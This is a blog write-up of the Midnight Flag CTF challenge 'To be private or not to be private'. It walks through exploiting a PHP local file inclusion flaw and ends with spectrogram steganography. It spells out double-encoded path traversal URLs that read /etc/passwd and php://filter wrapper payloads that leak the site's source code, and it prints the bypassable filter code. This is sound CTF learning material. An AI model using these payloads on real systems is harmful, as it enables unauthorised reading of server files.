<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>CTF Midnight Flag : To be private or not to be private | Sanlokii</title><meta name=keywords content><meta name=description content="Web/Steganography - Easy"><meta name=author content><link rel=canonical href=https://sanlokii.github.io/writeups/midnightflag/to-be-private-or-not-to-be-private/><link crossorigin=anonymous href=/assets/css/stylesheet.css rel="preload stylesheet" as=style><link rel=icon href=https://sanlokii.github.io/assets/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://sanlokii.github.io/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://sanlokii.github.io/favicon-32x32.png><link rel=apple-touch-icon href=https://sanlokii.github.io/apple-touch-icon.png><link rel=mask-icon href=https://sanlokii.github.io/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><noscript><style>#theme-toggle,.top-link{display:none}</style></noscript><meta property="og:title" content="CTF Midnight Flag : To be private or not to be private"><meta property="og:description" content="Web/Steganography - Easy"><meta property="og:type" content="article"><meta property="og:url" content="https://sanlokii.github.io/writeups/midnightflag/to-be-private-or-not-to-be-private/"><meta property="article:section" content="writeups"><meta property="article:published_time" content="2022-04-24T00:00:00+00:00"><meta property="article:modified_time" content="2022-04-24T00:00:00+00:00"><meta property="og:site_name" content="Sanlokii's Blog"><meta name=twitter:card content="summary"><meta name=twitter:title content="CTF Midnight Flag : To be private or not to be private"><meta name=twitter:description content="Web/Steganography - Easy"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Writeups","item":"https://sanlokii.github.io/writeups/"},{"@type":"ListItem","position":2,"name":"CTF Midnight Flag : To be private or not to be private","item":"https://sanlokii.github.io/writeups/midnightflag/to-be-private-or-not-to-be-private/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"CTF Midnight Flag : To be private or not to be private","name":"CTF Midnight Flag : To be private or not to be private","description":"Web/Steganography - Easy","keywords":[],"articleBody":"The challenge statement gives us the following site: https://cloud.midnightflag.fr/index.php\nBy manipulating the URL, I quickly realize that a LFI vulnerability is exploitable. So I start to inject a payload with double encoding in order to get the content of the file /etc/passwd : https://cloud.midnightflag.fr/index.php?categorie=..%252f..%252f..%252fetc%252fpasswd\nI have the content of the file in return but I don’t see any exploitable user or service:\nSo I decide to download the content of the index.php file with the PHP wrappers: https://cloud.midnightflag.fr/index.php?categorie=php:%252F%252Ffilter%252Fconvert.base64-encode%252Fresource=index.php\nWith this request, I get the content of the index.php file in base64 directly on the web page.\nAfter decoding, I see the following PHP code corresponding to the LFI filters applied (bypassing the function via double encoding):\n\u003c?php function lfi_filter($value) { $omit_words = array('..', '../', '/'); rsort($omit_words); $new_string = str_replace($omit_words, '', $value); return $new_string; } if (isset($_GET[\"category\"])) { $categorie = lfi_filter($_GET[\"category\"]); include urldecode($categorie); }else { include 'home.php'; } ?\u003e From this moment, I look for a little moment before continuing the challenge because the recovered PHP code gives us no additional information. Since fuzzing is not allowed on this challenge, it’s time for #guessing!\nLooking at the title of the challenge and in adequacy with the structure of the site, after several attempts I try to join the page private.php: https://cloud.midnightflag.fr/index.php?categorie=private.php and I have a return!\nSo I get the source code of this page with the same payload as before: https://cloud.midnightflag.fr/index.php?categorie=php:%252F%252Ffilter%252Fconvert.base64-encode%252Fresource=private.php\nI get the following source code with an interesting ASCII comment:\n\u003csection\u003e \u003ctd\u003e\u003cimg width=\"50%\" class=\"center\" src=\"categorie\\Why-So-Sad-Funny-Clown-Face-Picture.jpg\" alt=\"personal_attack.jpg\"\u003e\u003c/td\u003e \u003c/section\u003e After conversion, I get the following value: personal\nI suppose that the site has a personal category, so I go to the URL https://cloud.midnightflag.fr/index.php?categorie=personal.php which contains an audio recording in wav format.\nAfter downloading the audio recording, I open it with the Audacity software in order to analyze the content.\nThe audio generated by the recording leads me to believe that an information is present in the spectrogram !\nAfter inversion of the audio track and analysis of the spectrum, I recover the following information:\nFlag: MCTF{H1d3_Y0uR_S3cRe7s}\n","wordCount":"340","inLanguage":"en","datePublished":"2022-04-24T00:00:00Z","dateModified":"2022-04-24T00:00:00Z","mainEntityOfPage":{"@type":"WebPage","@id":"https://sanlokii.github.io/writeups/midnightflag/to-be-private-or-not-to-be-private/"},"publisher":{"@type":"Organization","name":"Sanlokii","logo":{"@type":"ImageObject","url":"https://sanlokii.github.io/assets/favicon.ico"}}}</script></head><body class=dark id=top><header class=header><nav class=nav><div class=logo><a href=https://sanlokii.github.io/ accesskey=h title="Sanlokii (Alt + H)">Sanlokii</a><div class=logo-switches></div></div><ul id=menu><li><a href=https://sanlokii.github.io/writeups/ title=Writeups><span>Writeups</span></a></li><li><a href=https://sanlokii.github.io/search/ title="Search (Alt + /)" accesskey=/><span>Search</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://sanlokii.github.io/>Home</a>&nbsp;»&nbsp;<a href=https://sanlokii.github.io/writeups/>Writeups</a></div><h1 class=post-title>CTF Midnight Flag : To be private or not to be private</h1><div class=post-description>Web/Steganography - Easy</div><div class=post-meta><span title='2022-04-24 00:00:00 +0000 UTC'>April 24, 2022</span></div></header><div class=post-content><p>The challenge statement gives us the following site: <code>https://cloud.midnightflag.fr/index.php</code></p><p>By manipulating the URL, I quickly realize that a LFI vulnerability is exploitable.
So I start to inject a payload with double encoding in order to get the content of the file <strong>/etc/passwd</strong> :
<code>https://cloud.midnightflag.fr/index.php?categorie=..%252f..%252f..%252fetc%252fpasswd</code></p><p>I have the content of the file in return but I don&rsquo;t see any exploitable user or service:</p><p><img loading=lazy src=https://user-images.githubusercontent.com/49941629/165366730-29a98123-13f2-47a2-ad28-a2bf67c8165f.png alt=cloud1></p><p>So I decide to download the content of the index.php file with the PHP wrappers:
<code>https://cloud.midnightflag.fr/index.php?categorie=php:%252F%252Ffilter%252Fconvert.base64-encode%252Fresource=index.php</code></p><p>With this request, I get the content of the index.php file in base64 directly on the web page.</p><p>After decoding, I see the following PHP code corresponding to the LFI filters applied (bypassing the function via double encoding):</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span>    <span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>lfi_filter</span>($value)
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>        $omit_words <span style=color:#f92672>=</span> <span style=color:#66d9ef>array</span>(<span style=color:#e6db74>&#39;..&#39;</span>, <span style=color:#e6db74>&#39;../&#39;</span>, <span style=color:#e6db74>&#39;/&#39;</span>);
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>rsort</span>($omit_words);
</span></span><span style=display:flex><span>        $new_string <span style=color:#f92672>=</span> <span style=color:#a6e22e>str_replace</span>($omit_words, <span style=color:#e6db74>&#39;&#39;</span>, $value);
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> $new_string;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>isset</span>($_GET[<span style=color:#e6db74>&#34;category&#34;</span>])) {
</span></span><span style=display:flex><span>      $categorie <span style=color:#f92672>=</span> <span style=color:#a6e22e>lfi_filter</span>($_GET[<span style=color:#e6db74>&#34;category&#34;</span>]);
</span></span><span style=display:flex><span>      <span style=color:#66d9ef>include</span> <span style=color:#a6e22e>urldecode</span>($categorie);
</span></span><span style=display:flex><span>    }<span style=color:#66d9ef>else</span> {
</span></span><span style=display:flex><span>      <span style=color:#66d9ef>include</span> <span style=color:#e6db74>&#39;home.php&#39;</span>;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    <span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
</span></span></span></code></pre></div><p>From this moment, I look for a little moment before continuing the challenge because the recovered PHP code gives us no additional information.
Since fuzzing is not allowed on this challenge, it&rsquo;s time for <strong>#guessing</strong>!</p><p>Looking at the title of the challenge and in adequacy with the structure of the site, after several attempts I try to join the page private.php: <code>https://cloud.midnightflag.fr/index.php?categorie=private.php</code> and I have a return!</p><p>So I get the source code of this page with the same payload as before:
<code>https://cloud.midnightflag.fr/index.php?categorie=php:%252F%252Ffilter%252Fconvert.base64-encode%252Fresource=private.php</code></p><p>I get the following source code with an interesting ASCII comment:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style=display:flex><span>&lt;<span style=color:#f92672>section</span>&gt;
</span></span><span style=display:flex><span>      &lt;<span style=color:#f92672>td</span>&gt;&lt;<span style=color:#f92672>img</span> <span style=color:#a6e22e>width</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;50%&#34;</span> <span style=color:#a6e22e>class</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;center&#34;</span> <span style=color:#a6e22e>src</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;categorie\Why-So-Sad-Funny-Clown-Face-Picture.jpg&#34;</span> <span style=color:#a6e22e>alt</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;personal_attack.jpg&#34;</span>&gt;&lt;/<span style=color:#f92672>td</span>&gt;
</span></span><span style=display:flex><span>      <span style=color:#75715e>&lt;!--don&#39;t leak (\x70\x65\x72\x73\x6F\x6E\x61\x6C) --&gt;</span>
</span></span><span style=display:flex><span>&lt;/<span style=color:#f92672>section</span>&gt;
</span></span></code></pre></div><p>After conversion, I get the following value: <strong>personal</strong></p><p>I suppose that the site has a personal category, so I go to the URL <code>https://cloud.midnightflag.fr/index.php?categorie=personal.php</code> which contains an audio recording in wav format.</p><p>After downloading the audio recording, I open it with the Audacity software in order to analyze the content.</p><p>The audio generated by the recording leads me to believe that an information is present in the spectrogram !</p><p>After inversion of the audio track and analysis of the spectrum, I recover the following information:</p><p><img loading=lazy src=https://user-images.githubusercontent.com/49941629/165366030-8d6061f3-34d3-4f9b-8bfd-6a262bef336e.png alt=cloud2></p><p>Flag: <code>MCTF{H1d3_Y0uR_S3cRe7s}</code></p></div><footer class=post-footer><ul class=post-tags></ul><nav class=paginav><a class=prev href=https://sanlokii.github.io/writeups/midnightflag/nothing-is-classified/><span class=title>« Prev</span><br><span>CTF Midnight Flag : Nothing is classified</span></a>
<a class=next href=https://sanlokii.github.io/writeups/midnightflag/%D0%BA%D1%80%D1%83%D0%B7%D0%B5%D0%BD%D1%88%D1%82%D0%B5%D1%80%D0%BD/><span class=title>Next »</span><br><span>CTF Midnight Flag : Крузенштерн</span></a></nav><div class=share-buttons><a target=_blank rel="noopener noreferrer" aria-label="share CTF Midnight Flag : To be private or not to be private on twitter" href="https://twitter.com/intent/tweet/?text=CTF%20Midnight%20Flag%20%3a%20To%20be%20private%20or%20not%20to%20be%20private&url=https%3a%2f%2fsanlokii.github.io%2fwriteups%2fmidnightflag%2fto-be-private-or-not-to-be-private%2f&hashtags="><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM195.519 424.544c135.939.0 210.268-112.643 210.268-210.268.0-3.218.0-6.437-.153-9.502 14.406-10.421 26.973-23.448 36.935-38.314-13.18 5.824-27.433 9.809-42.452 11.648 15.326-9.196 26.973-23.602 32.49-40.92-14.252 8.429-30.038 14.56-46.896 17.931-13.487-14.406-32.644-23.295-53.946-23.295-40.767.0-73.87 33.104-73.87 73.87.0 5.824.613 11.494 1.992 16.858-61.456-3.065-115.862-32.49-152.337-77.241-6.284 10.881-9.962 23.601-9.962 37.088.0 25.594 13.027 48.276 32.95 61.456-12.107-.307-23.448-3.678-33.41-9.196v.92c0 35.862 25.441 65.594 59.311 72.49-6.13 1.686-12.72 2.606-19.464 2.606-4.751.0-9.348-.46-13.946-1.38 9.349 29.426 36.628 50.728 68.965 51.341-25.287 19.771-57.164 31.571-91.8 31.571-5.977.0-11.801-.306-17.625-1.073 32.337 21.15 71.264 33.41 112.95 33.41z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share CTF Midnight Flag : To be private or not to be private on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&url=https%3a%2f%2fsanlokii.github.io%2fwriteups%2fmidnightflag%2fto-be-private-or-not-to-be-private%2f&title=CTF%20Midnight%20Flag%20%3a%20To%20be%20private%20or%20not%20to%20be%20private&summary=CTF%20Midnight%20Flag%20%3a%20To%20be%20private%20or%20not%20to%20be%20private&source=https%3a%2f%2fsanlokii.github.io%2fwriteups%2fmidnightflag%2fto-be-private-or-not-to-be-private%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg></a></div></footer></article></main><footer class=footer><span>&copy; 2023 <a href=https://sanlokii.github.io/>Sanlokii</a></span>
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg></a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="copy";function s(){t.innerHTML="copied!",setTimeout(()=>{t.innerHTML="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>